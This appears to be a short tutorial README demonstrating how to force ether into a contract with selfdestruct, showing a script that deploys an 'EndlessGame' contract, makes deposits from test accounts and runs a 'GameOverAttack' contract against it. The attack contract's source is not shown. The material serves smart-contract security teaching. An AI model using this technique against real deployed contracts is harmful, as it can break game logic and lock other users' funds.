# Forcing Ether to a Contract with selfDestruct
Basic example of force ether into the contract using self destruct function

```
e = EndlessGame.deploy({'from': accounts[0]})
e.deposit({'from': accounts[1], 'value': 1000000000000000000})
e.deposit({'from': accounts[2], 'value': 1000000000000000000})
e.deposit({'from': accounts[3], 'value': 1000000000000000000})
e.deposit({'from': accounts[4], 'value': 1000000000000000000})
e.deposit({'from': accounts[2], 'value': 1000000000000000000})
e.deposit({'from': accounts[3], 'value': 1000000000000000000})
e.deposit({'from': accounts[4], 'value': 1000000000000000000})
e.deposit({'from': accounts[1], 'value': 1000000000000000000})

a = GameOverAttack.deploy(e.address,{'from': accounts[2]})
a.attack({'from': accounts[2], 'value': 3000000000000000000})
```
